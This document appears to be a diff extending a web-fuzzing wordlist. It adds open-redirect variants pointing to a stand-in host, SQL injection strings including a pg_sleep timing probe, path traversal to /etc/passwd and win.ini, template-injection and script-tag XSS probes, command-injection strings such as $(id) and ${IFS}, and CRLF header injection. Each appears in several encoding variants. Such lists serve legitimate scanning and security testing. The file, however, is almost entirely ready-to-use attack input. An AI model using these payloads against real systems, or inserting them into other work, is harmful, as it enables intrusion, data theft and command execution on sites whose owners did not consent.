@@ -78,3 +78,163 @@ openredirect_1
 ///evil.example&v=2
 %2F%2F%2Fevil.example_2
 openredirect_2
+%252F%252Fevil.example
+//evil.example?aurose=1
+//evil.example&aurose=1
+//evil.example.bak
+//evil.example.old
+https%253A%252F%252Fevil.example
+https://evil.example?aurose=1
+https://evil.example&aurose=1
+///evil.example/%2e%2e
+%2F%2F%2Fevil.example%2F%252e%252e
+%252F%252F%252Fevil.example%252F%25252e%25252e
+///EVIL.EXAMPLE/%2E%2E
+///evil.example/%2e%2e?aurose=1
+///evil.example/%2e%2e&aurose=1
+///evil.example/%2e%2e.bak
+///evil.example/%2e%2e.old
+https://example.com@evil.example
+https%3A%2F%2Fexample.com%40evil.example
+https%253A%252F%252Fexample.com%2540evil.example
+HTTPS://EXAMPLE.COM@EVIL.EXAMPLE
+https://example.com@evil.example?aurose=1
+https://example.com@evil.example&aurose=1
+/\evil.example
+%2F%5Cevil.example
+%252F%255Cevil.example
+/\EVIL.EXAMPLE
+/\evil.example?aurose=1
+/\evil.example&aurose=1
+/\evil.example.bak
+/\evil.example.old
+https:%2f%2fevil.example
+https%3A%252f%252fevil.example
+https%253A%25252f%25252fevil.example
+HTTPS:%2F%2FEVIL.EXAMPLE
+https:%2f%2fevil.example?aurose=1
+https:%2f%2fevil.example&aurose=1
+//%65vil.example
+%2F%2F%2565vil.example
+%252F%252F%252565vil.example
+//%65VIL.EXAMPLE
+//%65vil.example?aurose=1
+//%65vil.example&aurose=1
+//%65vil.example.bak
+//%65vil.example.old
+https://trusted.example.evil.example/
+https%3A%2F%2Ftrusted.example.evil.example%2F
+https%253A%252F%252Ftrusted.example.evil.example%252F
+HTTPS://TRUSTED.EXAMPLE.EVIL.EXAMPLE/
+https://trusted.example.evil.example/?aurose=1
+https://trusted.example.evil.example/&aurose=1
+javascript:location.href="https://evil.example"
+javascript%3Alocation.href%3D%22https%3A%2F%2Fevil.example%22
+javascript%253Alocation.href%253D%2522https%253A%252F%252Fevil.example%2522
+javascript:location.href%3d"https://evil.example"
+JAVASCRIPT:LOCATION.HREF="HTTPS://EVIL.EXAMPLE"
+javascript:location.href="https://evil.example"?aurose=1
+javascript:location.href="https://evil.example"&aurose=1
+/%09/evil.example
+%2F%2509%2Fevil.example
+%252F%252509%252Fevil.example
+/%09/EVIL.EXAMPLE
+/%09/evil.example?aurose=1
+/%09/evil.example&aurose=1
+/%09/evil.example.bak
+/%09/evil.example.old
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+$(id)
+%24%28id%29
+%2524%2528id%2529
+$(ID)
+$(id)?aurose=1
+$(id)&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+//evil.example::var0
+%2F%2Fevil.example::v0
+/openredirect/probe/0
+https://evil.example::var1
+https%3A%2F%2Fevil.example::v1
+/openredirect/probe/1
+///evil.example/%2e%2e::var2
+%2F%2F%2Fevil.example%2F%252e%252e::v2
+/openredirect/probe/2
+https://example.com@evil.example::var3
+https%3A%2F%2Fexample.com%40evil.example::v3
+/openredirect/probe/3
+/\evil.example::var4
+%2F%5Cevil.example::v4
+/openredirect/probe/4
+https:%2f%2fevil.example::var5
+https%3A%252f%252fevil.example::v5
+/openredirect/probe/5
